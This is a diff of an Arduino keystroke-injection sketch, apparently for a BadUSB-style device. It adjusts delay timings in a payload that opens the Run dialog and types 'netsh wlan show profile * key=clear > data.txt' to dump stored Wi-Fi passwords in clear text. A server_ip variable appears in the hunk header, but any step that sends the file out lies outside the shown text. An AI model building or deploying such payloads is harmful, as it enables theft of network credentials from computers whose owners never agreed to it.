@@ -9,7 +9,7 @@ const char* server_ip = "192.168.8.124";
 void setup() {
 
   Keyboard.begin(); //start keyboard communication 
-   delay(600);
+   delay(2000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(600); 
    Keyboard.press('r');
@@ -30,7 +30,7 @@ void setup() {
    Keyboard.release('d');
    delay(1000);
    Keyboard.press(KEY_RETURN);
-   delay(600);
+   delay(2000);
    Keyboard.release(KEY_RETURN);
    delay(600); 
    Keyboard.println("netsh wlan show profile * key=clear > data.txt");
